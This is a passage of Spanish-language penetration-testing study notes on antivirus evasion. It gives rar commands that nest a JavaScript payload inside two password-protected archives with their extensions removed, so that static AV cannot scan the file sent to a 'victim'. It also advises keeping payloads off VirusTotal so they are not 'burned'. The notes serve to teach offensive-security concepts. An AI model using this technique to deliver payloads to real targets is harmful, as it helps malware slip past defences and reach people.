wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar
```

#### 2. Empaquetar el payload con contraseña (capa 1)
```bash
rar a ~/test.rar -p ~/test.js
```
Introduce la contraseña cuando la pida → genera `test.rar` con `test.js` cifrado dentro.

#### 3. Quitar la extensión `.rar`
```bash
mv test.rar test
```

#### 4. Volver a empaquetar con contraseña (capa 2)
```bash
rar a test2.rar -p test
```
`test2.rar` contiene `test` (el RAR anterior, ya sin extensión).

#### 5. Quitar la extensión del segundo RAR
```bash
mv test2.rar test2
```

#### Resultado
```
test2                     ← lo que transfieres a la víctima
└── test (RAR cifrado)    ← capa 2, sin extensión
    └── test.js           ← payload real, el AV nunca lo ve
```

> [!NOTE]
> **Por qué funciona**
> - El AV **no puede escanear el contenido de un RAR cifrado** con contraseña.
> - **Sin extensión**, el AV no ve a primera vista que es un RAR.
> - **Dos capas** = tendría que superar dos barreras con contraseña.

> [!WARNING]
> **Límite**
> Es evasión del **AV estático** (en tránsito y en disco). La víctima necesita la contraseña y WinRAR/7-Zip para desempaquetar; y **al descomprimir y ejecutar** el payload, un **EDR de comportamiento** todavía podría detectarlo.

---

### VirusTotal

> [!WARNING]
> **Pendiente**
> El apartado original de las notas sobre integración con **VirusTotal** quedó vacío (sin contenido capturado en su momento). Se deja marcado como **pendiente de completar** en un repaso posterior, en vez de inventar contenido no verificado.
>
> Idea general (conocimiento establecido): VirusTotal analiza un fichero/URL con **muchos motores AV a la vez**. Ojo — **subir tu payload a VirusTotal lo comparte con los proveedores de AV**, así que puede "quemar" tu binario; para pruebas privadas se usan alternativas que no distribuyen la muestra.

---

### Resumen rápido

| Concepto | Clave |
|----------|-------|
| Endpoint protection | Protege **un host** (AV local) |
| Perimeter protection | Protege el **borde de red** (firewall/IDS/IPS) |
| Signature-based detection | Compara con **firmas conocidas** → ofuscar puede evadirla |
| EDR moderno | Heurística + comportamiento → encoders **no** bastan |
| RAR doble (`rar a -p` ×2, sin extensión) | Oculta el payload del **AV estático** (RAR cifrado no escaneable) |
| VirusTotal | Multi-AV, pero **comparte la muestra** (puede quemar el payload) |

---
